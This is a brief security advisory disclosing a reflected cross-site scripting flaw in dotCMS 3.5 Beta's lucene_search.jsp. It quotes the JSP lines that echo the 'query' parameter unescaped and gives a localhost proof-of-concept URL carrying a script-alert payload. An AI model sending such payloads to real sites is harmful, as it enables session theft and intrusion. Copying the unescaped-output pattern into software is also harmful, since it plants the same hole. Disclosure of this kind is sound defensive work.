Advisory: DotCMS xss vulnerability

Author: Piaox From Pingan Product Safety Group

Email: xiongyaofu351@pingan.com.cn

Affected Version: dotCMS 3.5 Beta(the latest version)


Vulnerability Description

lucene_search.jsp

 26 String query = request.getParameter("query");

 27 if(!UtilMethods.isSet(query)){

 28         query = "";

 29 }

164                 <div><strong><%= LanguageUtil.get(pageContext,
"Query-is") %> : </strong><%=query%></div>

POC && EXP

http://127.0.0.1:8080/c/portal/layout?p_l_id=a8e430e3-8010-40cf-ade1-5978e61241a8&p_p_id=EXT_LUCENE_TOOL&p_p_action=0&

query=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&offset=0&limit=20&sort=&userid=


